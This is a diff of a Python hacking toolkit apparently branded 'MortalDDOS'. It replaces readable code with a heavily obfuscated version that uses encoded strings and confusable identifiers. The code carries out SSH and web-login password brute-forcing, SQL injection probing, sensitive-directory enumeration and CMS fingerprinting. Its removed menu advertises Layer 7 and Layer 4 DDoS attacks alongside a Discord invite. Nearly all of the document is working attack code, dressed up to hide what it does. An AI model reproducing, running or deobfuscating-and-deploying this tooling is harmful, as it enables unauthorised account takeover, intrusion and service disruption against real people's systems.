+        if llIlIIlIIIIIlIllIlIIlIIlII == (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 164 for IlIlIIlIlIllllI in x[::-1]]).decode())([221]):
+            lIIllllllIIIlIIllIIlIIlll = lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 886692406078).to_bytes(5, 'big').decode())(717738481226)](f'{Fore.CYAN}Enter password file name: {Fore.WHITE}')
+            IIIIIIIIIIIlll = IlIlllIlIIlIlIll.IIIIIlIIIlIIl(lIIllllllIIIlIIllIIlIIlll)
+            if IIIIIIIIIIIlll:
+                passwords = IIIIIIIIIIIlll
+            else:
+                lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 340435466119).to_bytes(5, 'big').decode())(271419808243)](f'{Fore.YELLOW}[!] Using default password list')
+        for password in passwords:
+            try:
+                lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 118)) for IlIlIllIlIIlIlllI in x)))([6, 4, 31, 24, 2])](f'{Fore.YELLOW}[?] Trying: {password}', end=(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 170) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('a7'))
+                llIlIIlIllIIlIIllI = lIlllIIIllIl(llIIIIIIIllIIIIIlIllllII, data={(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('656d616e72657375'): username, (lambda n: int.__xor__(n, 8993136284468761315).to_bytes(8, 'big').decode())(914084209650344071): password}, timeout=0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('37'), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 103).to_bytes(1, 'big').decode())(83), 16))
+                if (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('6472616f6268736164') in llIlIIlIllIIlIIllI.text.lower() or llIlIIlIllIIlIIllI.status_code == 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 90)) for IlIlIllIlIIlIlllI in x)))([108, 98]), 16) ^ 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 14)) for IlIlIllIlIIlIlllI in x)))([63, 58, 56]), 16):
+                    lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 81) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('2123383f25')](f'{Fore.GREEN}[!] SUCCESS! Password found: {password}')
+                    return
+            except Exception as e:
+                lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.RED}[-] Request error: {e}')
+                continue
+        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 689200185921).to_bytes(5, 'big').decode())(893451840565)](f'{Fore.RED}[-] Password not found in wordlist')
+
+    @staticmethod
+    def lIllIIIlIIIIIIlIlllIlIIlIl(lllIlIIIllIllI, username):
         try:
             import paramiko
         except ImportError:
-            print(f"{Fore.RED}[-] Paramiko library not found. Install with: pip install paramiko")
+            lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 78)) for IlIlIllIlIIlIlllI in x)))([62, 60, 39, 32, 58])](f'{Fore.RED}[-] Paramiko library not found. Install with: pip install paramiko')
             return
-            
-        print(f"{Fore.CYAN}[+] Starting SSH bruteforce on {host}")
-        print(f"{Fore.CYAN}[+] Target user: {username}")
-        
-        # Ask user if they want to use custom password file
-        use_custom = input(f"{Fore.CYAN}Use custom password file? (y/n, default n): {Fore.WHITE}").lower()
-        passwords = PASSWORD_LIST
-        
-        if use_custom == 'y':
-            filename = input(f"{Fore.CYAN}Enter password file name: {Fore.WHITE}")
-            custom_passwords = PasswordAttacks.load_passwords_from_file(filename)
-            if custom_passwords:
-                passwords = custom_passwords
+        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 89)) for IlIlIllIlIIlIlllI in x)))([41, 43, 48, 55, 45])](f'{Fore.CYAN}[+] Starting SSH bruteforce on {lllIlIIIllIllI}')
+        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 331157149794).to_bytes(5, 'big').decode())(263753070102)](f'{Fore.CYAN}[+] Target user: {username}')
+        llIlIIlIIIIIlIllIlIIlIIlII = lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 6)) for IlIlIllIlIIlIlllI in x)))([111, 104, 118, 115, 114])](f'{Fore.CYAN}Use custom password file? (y/n, default n): {Fore.WHITE}').lower()
+        passwords = IIllIllIIllI
+        if llIlIIlIIIIIlIllIlIIlIIlII == (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('79'):
+            lIIllllllIIIlIIllIIlIIlll = lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 230) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('8f88969392')](f'{Fore.CYAN}Enter password file name: {Fore.WHITE}')
+            IIIIIIIIIIIlll = IlIlllIlIIlIlIll.IIIIIlIIIlIIl(lIIllllllIIIlIIllIIlIIlll)
+            if IIIIIIIIIIIlll:
+                passwords = IIIIIIIIIIIlll
             else:
-                print(f"{Fore.YELLOW}[!] Using default password list")
-        
+                lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 37 for IlIlIIlIlIllllI in x[::-1]]).decode())([81, 75, 76, 87, 85])](f'{Fore.YELLOW}[!] Using default password list')
         for password in passwords:
             try:
-                print(f"{Fore.YELLOW}[?] Trying: {password}", end='\r')
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(host, username=username, password=password, timeout=3)
-                print(f"{Fore.GREEN}[!] SUCCESS! Password found: {password}")
-                ssh.close()
+                lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 211) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('a3a1babda7')](f'{Fore.YELLOW}[?] Trying: {password}', end=(lambda n: int.__xor__(n, 214).to_bytes(1, 'big').decode())(219))
+                lIIIlIIllllI = paramiko.SSHClient()
+                lIIIlIIllllI.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                lIIIlIIllllI.connect(lllIlIIIllIllI, username=username, password=password, timeout=0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 209) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e0e7e3'), 16) - 0 .__class__((lambda n: int.__xor__(n, 8462147).to_bytes(3, 'big').decode())(11545093), 16))
+                lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 56)) for IlIlIllIlIIlIlllI in x)))([72, 74, 81, 86, 76])](f'{Fore.GREEN}[!] SUCCESS! Password found: {password}')
+                lIIIlIIllllI.close()
                 return
             except paramiko.AuthenticationException:
                 continue
             except Exception as e:
-                print(f"{Fore.RED}[-] SSH connection error: {e}")
+                lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 495198136445).to_bytes(5, 'big').decode())(13932594697)](f'{Fore.RED}[-] SSH connection error: {e}')
                 continue
-        
-        print(f"{Fore.RED}[-] Password not found in wordlist")
-# --- WEB HACKING ---
-class WebHacking:
+        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 121)) for IlIlIllIlIIlIlllI in x)))([9, 11, 16, 23, 13])](f'{Fore.RED}[-] Password not found in wordlist')
+
+class lIlIIlIlIllII:
+
     @staticmethod
-    def sqli_scanner(url):
-        """Scan for SQL injection vulnerabilities"""
-        print(f"{Fore.CYAN}[+] Scanning {url} for SQL injection...")
-        
-        for payload in SQLI_PAYLOADS:
+    def lIlIlIlIlIIIl(llIIIIIIIllIIIIIlIllllII):
+        lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.CYAN}[+] Scanning {llIIIIIIIllIIIIIlIllllII} for SQL injection...')
+        for IllIllIllIllIIIIlIIllI in IlIllIllIllIllII:
             try:
-                test_url = f"{url}?id={payload}"
-                response = requests.get(test_url, timeout=5)
-                if any(keyword in response.text.lower() for keyword in ['mysql', 'syntax', 'sql', 'error']):
-                    print(f"{Fore.GREEN}[!] Possible SQLi found: {test_url}")
+                IlIlIIllIllIIlllIllI = f'{llIIIIIIIllIIIIIlIllllII}?id={IllIllIllIllIIIIlIIllI}'
+                llIlIIlIllIIlIIllI = lIllIIlllIlIIIllIllIIlIII(IlIlIIllIllIIlllIllI, timeout=0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 109)) for IlIlIllIlIIlIlllI in x)))([43]), 16) * 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 118)) for IlIlIllIlIIlIlllI in x)))([70]), 16) + 0 .__class__((lambda n: int.__xor__(n, 2).to_bytes(1, 'big').decode())(55), 16))
+                if lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 57 for IlIlIIlIlIllllI in x[::-1]]).decode())([64, 87, 88])]((llllIllllIIlllIIIIlIIlIlIl in llIlIIlIllIIlIIllI.text.lower() for llllIllllIIlllIIIIlIIlIlIl in [(lambda n: int.__xor__(n, 307299505531).to_bytes(5, 'big').decode())(184499643415), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 26) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('6963746e7b62'), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 33)) for IlIlIllIlIIlIlllI in x)))([82, 80, 77]), (lambda n: int.__xor__(n, 445624067764).to_bytes(5, 'big').decode())(11596319174)])):
+                    lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 1) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('7173686f75')](f'{Fore.GREEN}[!] Possible SQLi found: {IlIlIIllIllIIlllIllI}')
                     return
             except:
                 pass
-        
-        print(f"{Fore.RED}[-] No SQLi vulnerabilities detected")
+        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 17) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('6163787f65')](f'{Fore.RED}[-] No SQLi vulnerabilities detected')
 
     @staticmethod
-    def directory_finder(url):
-        """Find sensitive directories and files"""
-        print(f"{Fore.CYAN}[+] Searching directories on {url}")
-        
-        for path in VULN_PATHS:
+    def IIllIlIlIIllIIIIlI(llIIIIIIIllIIIIIlIllllII):
+        lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.CYAN}[+] Searching directories on {llIIIIIIIllIIIIIlIllllII}')
+        for IIIIllllIIllIIlIIlIIllIIll in lIlIIIllllIIllll:
             try:
-                full_url = url.rstrip('/') + path
-                response = requests.head(full_url, timeout=3)
-                if response.status_code == 200:
-                    print(f"{Fore.GREEN}[!] Found: {full_url}")
+                IIIlIIlIIlllIIIIllll = llIIIIIIIllIIIIIlIllllII.rstrip((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 2)) for IlIlIllIlIIlIlllI in x)))([45])) + IIIIllllIIllIIlIIlIIllIIll
+                llIlIIlIllIIlIIllI = IIlIIIlIIIIlIIIlllIIlII(IIIlIIlIIlllIIIIllll, timeout=0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 209 for IlIlIIlIlIllllI in x[::-1]]).decode())([226, 227]), 16) ^ 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3032'), 16))
+                if llIlIIlIllIIlIIllI.status_code == 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 60)) for IlIlIllIlIIlIlllI in x)))([15, 14]), 16) << 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 132) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('b6'), 16) | 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 111 for IlIlIIlIlIllllI in x[::-1]]).decode())([95]), 16):
+                    lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.GREEN}[!] Found: {IIIlIIlIIlllIIIIllll}')
             except:
                 pass
-        
-        print(f"{Fore.CYAN}[+] Directory search completed")
-    
+        lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.CYAN}[+] Directory search completed')
+
     @staticmethod
-    def cms_detector(url):
-        """Detect CMS of a website with improved error handling"""
+    def IlIlIllllIlI(llIIIIIIIllIIIIIlIllllII):
         try:
-            print(f"{Fore.CYAN}[+] Detecting CMS for {url}...")
-            response = requests.get(url, timeout=10)
-            headers = response.headers
-            content = response.text.lower()
-            
-            # CMS detection patterns
-            cms_patterns = {
-                'WordPress': ['wp-content', 'wordpress', '/wp-includes/', 'xmlns="http://wordpress.org/export'],
-                'Joomla': ['joomla', 'com_content', 'Joomla!', '/templates/joomla/'],
-                'Drupal': ['drupal', 'sites/all/themes', 'Powered by Drupal'],
-                'Magento': ['magento', 'Mage.Cookies', 'catalog/product_view'],
-                'Shopify': ['shopify', 'myshopify.com'],
-                'Ghost': ['ghost-blog', 'ghost.org'],
-                'PrestaShop': ['prestashop', 'ps_languages', 'blockcart'],
-                'OpenCart': ['opencart', 'index.php?route='],
-                'TYPO3': ['typo3', 'tx_solr', 't3lib'],
-                'Concrete5': ['concrete5', 'ccm-layout-area']
-            }
-            
-            detected_cms = []
-            for cms, patterns in cms_patterns.items():
-                if any(pattern in content for pattern in patterns) or \
-                   any(cms.lower() in str(value).lower() for value in headers.values()):
-                    detected_cms.append(cms)
-            
-            if detected_cms:
-                print(f"{Fore.GREEN}[!] Detected CMS: {', '.join(detected_cms)}")
+            lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 831840283272).to_bytes(5, 'big').decode())(763965342972)](f'{Fore.CYAN}[+] Detecting CMS for {llIIIIIIIllIIIIIlIllllII}...')
+            llIlIIlIllIIlIIllI = lIllIIlllIlIIIllIllIIlIII(llIIIIIIIllIIIIIlIllllII, timeout=0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 149 for IlIlIIlIlIllllI in x[::-1]]).decode())([164]), 16) << 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 129 for IlIlIIlIlIllllI in x[::-1]]).decode())([178]), 16) | 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 31 for IlIlIIlIlIllllI in x[::-1]]).decode())([45]), 16))
+            IlIIllIIIllll = llIlIIlIllIIlIIllI.IlIIllIIIllll
+            content = llIlIIlIllIIlIIllI.text.lower()
+            lllIlIllIIIl = {(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 85) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('023a27310527302626'): [(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 243) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('8483de909c9d87969d87'), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 46)) for IlIlIllIlIIlIlllI in x)))([89, 65, 92, 74, 94, 92, 75, 93, 93]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 84)) for IlIlIllIlIIlIlllI in x)))([123, 35, 36, 121, 61, 58, 55, 56, 33, 48, 49, 39, 123]), (lambda n: int.__xor__(n, 2556802558421016125861753758526895760494628841021047828056250997689801484582401599).to_bytes(34, 'big').decode())(1368846237579725957868224988034338677210178657554125790697919476446224790896329803)], (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 32 for IlIlIIlIlIllllI in x[::-1]]).decode())([65, 76, 77, 79, 79, 106]): [(lambda n: int.__xor__(n, 101616146172044).to_bytes(6, 'big').decode())(59391699494125), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 17)) for IlIlIllIlIIlIlllI in x)))([114, 126, 124, 78, 114, 126, 127, 101, 116, 127, 101]), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 219) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('91b4b4b6b7bafa'), (lambda n: int.__xor__(n, 18070000103406579008113198665917546183391046).to_bytes(18, 'big').decode())(19522191173503753511155991972733961002653289)], (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 118) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('32040306171a'): [(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 80)) for IlIlIllIlIIlIlllI in x)))([52, 34, 37, 32, 49, 60]), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 80) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('23392435237f313c3c7f2438353d3523'), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('6c61707572442079622064657265776f50')], (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('6f746e6567614d'): [(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 87) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('3a363032392338'), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 134) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('cbe7e1e3a8c5e9e9edefe3f5'), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('776569765f746375646f72702f676f6c61746163')], (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 36) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('774c4b544d425d'): [(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 108) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('1f04031c050a15'), (lambda n: int.__xor__(n, 19096161270965155842936787136186).to_bytes(13, 'big').decode())(12398729949302825378993618026967)], (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 119)) for IlIlIllIlIIlIlllI in x)))([48, 31, 24, 4, 3]): [(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 35)) for IlIlIllIlIIlIlllI in x)))([68, 75, 76, 80, 87, 14, 65, 79, 76, 68]), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('67726f2e74736f6867')], (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 160 for IlIlIIlIlIllllI in x[::-1]]).decode())([208, 207, 200, 243, 193, 212, 211, 197, 210, 240]): [(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 180) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('c4c6d1c7c0d5c7dcdbc4'), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 41)) for IlIlIllIlIIlIlllI in x)))([89, 90, 118, 69, 72, 71, 78, 92, 72, 78, 76, 90]), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('747261636b636f6c62')], (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 235) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('a49b8e85a88a999f'): [(lambda n: int.__xor__(n, 11511920138580339182).to_bytes(8, 'big').decode())(17344183714633898906), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 208 for IlIlIIlIlIllllI in x[::-1]]).decode())([237, 181, 164, 165, 191, 162, 239, 160, 184, 160, 254, 168, 181, 180, 190, 185])], (lambda n: int.__xor__(n, 364009658263).to_bytes(5, 'big').decode())(2583353508): [(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('336f707974'), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 146 for IlIlIIlIlIllllI in x[::-1]]).decode())([224, 254, 253, 225, 205, 234, 230]), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 215 for IlIlIIlIlIllllI in x[::-1]]).decode())([181, 190, 187, 228, 163])], (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 69) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('062a2b263720312070'): [(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3565746572636e6f63'), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 66)) for IlIlIllIlIIlIlllI in x)))([33, 33, 47, 111, 46, 35, 59, 45, 55, 54, 111, 35, 48, 39, 35])]}
+            IIIIllIIlIIIlllllll = []
+            for IIlllIlIlllIll, lIIIlIIIllIIIlI in lllIlIllIIIl.items():
+                if lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 11416265).to_bytes(3, 'big').decode())(13589680)]((lIIIlIlllllll in content for lIIIlIlllllll in lIIIlIIIllIIIlI)) or lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 5) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('646b7c')]((IIlllIlIlllIll.lower() in lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 208 for IlIlIIlIlIllllI in x[::-1]]).decode())([162, 164, 163])](value).lower() for value in IlIIllIIIllll.values())):
+                    IIIIllIIlIIIlllllll.append(IIlllIlIlllIll)
+            if IIIIllIIlIIIlllllll:
+                lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 122)) for IlIlIllIlIIlIlllI in x)))([10, 8, 19, 20, 14])](f"{Fore.GREEN}[!] Detected CMS: {(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 97)) for IlIlIllIlIIlIlllI in x)))([77, 65]).join(IIIIllIIlIIIlllllll)}")
             else:
-                print(f"{Fore.YELLOW}[!] No known CMS detected")
-                
+                lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.YELLOW}[!] No known CMS detected')
         except requests.exceptions.RequestException as e:
-            print(f"{Fore.RED}[-] Network error detecting CMS: {e}")
+            lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 795333491051).to_bytes(5, 'big').decode())(864898553631)](f'{Fore.RED}[-] Network error detecting CMS: {e}')
         except Exception as e:
-            print(f"{Fore.RED}[-] Error detecting CMS: {e}")
+            lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.RED}[-] Error detecting CMS: {e}')
 
-# --- MAIN INTERFACE ---
-class MortalInterface:
-    @staticmethod
-    def banner():
-        os.system('cls' if os.name == 'nt' else 'clear')
-        print(f"{Fore.RED}{Style.BRIGHT}")
-        print(f"""{Fore.WHITE}
- /$$      /$$                       /$$               /$$ /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$ 
-| $$$    /$$$                      | $$              | $$| $$__  $$| $$__  $$ /$$__  $$ /$$__  $$
-| $$$$  /$$$$  /$$$$$$   /$$$$$$  /$$$$$$    /$$$$$$ | $$| $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/
-| $$ $$/$$ $$ /$$__  $$ /$$__  $$|_  $$_/   |____  $$| $$| $$  | $$| $$  | $$| $$  | $$|  $$$$$$ 
-{Fore.RED}| $$  $$$| $$| $$  \ $$| $$  \__/  | $$      /$$$$$$$| $$| $$  | $$| $$  | $$| $$  | $$ \____  $$
-| $$\  $ | $$| $$  | $$| $$        | $$ /$$ /$$__  $$| $$| $$  | $$| $$  | $$| $$  | $$ /$$  \ $$
-| $$ \/  | $$|  $$$$$$/| $$        |  $$$$/|  $$$$$$$| $$| $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/
-|__/     |__/ \______/ |__/         \___/   \_______/|__/|_______/ |_______/  \______/  \______/ """)
-        print(f"{Fore.CYAN}" + "="*60)
-        print(f"{Fore.RED}Devs: KapiczeK and I Love Pizza {Fore.WHITE}|{Fore.RED} MortalDDOS Discord: {Fore.GREEN}https://discord.gg/GZv42uqH")
-        print(f"{Fore.CYAN}" + "="*60)
+class lIIIlIlIIIlIlI:
 
     @staticmethod
-    def main_menu():
-        print(f"\n[1]  {Fore.RED}Layer 7 DDoS Attack (HTTP/HTTPS)")
-        print(f"[2]  {Fore.RED}Layer 4 DDoS Attack (TCP/UDP)")
-        print(f"[3]  {Fore.RED}Information Gathering")
-        print(f"[4]  {Fore.RED}Password Attacks")
-        print(f"[5]  {Fore.RED}Web Hacking")
-        print(f"[0]  {Fore.RED}Exit")
-        print(f"{Fore.CYAN}" + "="*60)
+    def lIIIlllIIlIl():
+        lllIllIIIlllllIlIIl((lambda n: int.__xor__(n, 2429184).to_bytes(3, 'big').decode())(4619635) if os.name == (lambda n: int.__xor__(n, 27297).to_bytes(2, 'big').decode())(1237) else (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 128 for IlIlIIlIlIllllI in x[::-1]]).decode())([242, 225, 229, 236, 227]))
+        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 634205366602).to_bytes(5, 'big').decode())(978648336190)](f'{Fore.RED}{Style.BRIGHT}')
+        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 71)) for IlIlIllIlIIlIlllI in x)))([55, 53, 46, 41, 51])](f'{Fore.WHITE}\n /$$      /$$                       /$$               /$$ /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$ \n| $$$    /$$$                      | $$              | $$| $$__  $$| $$__  $$ /$$__  $$ /$$__  $$\n| $$$$  /$$$$  /$$$$$$   /$$$$$$  /$$$$$$    /$$$$$$ | $$| $$  \\ $$| $$  \\ $$| $$  \\ $$| $$  \\__/\n| $$ $$/$$ $$ /$$__  $$ /$$__  $$|_  $$_/   |____  $$| $$| $$  | $$| $$  | $$| $$  | $$|  $$$$$$ \n{Fore.RED}| $$  $$$| $$| $$  \\ $$| $$  \\__/  | $$      /$$$$$$$| $$| $$  | $$| $$  | $$| $$  | $$ \\____  $$\n| $$\\  $ | $$| $$  | $$| $$        | $$ /$$ /$$__  $$| $$| $$  | $$| $$  | $$| $$  | $$ /$$  \\ $$\n| $$ \\/  | $$|  $$$$$$/| $$        |  $$$$/|  $$$$$$$| $$| $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/\n|__/     |__/ \\______/ |__/         \\___/   \\_______/|__/|_______/ |_______/  \\______/  \\______/ ')
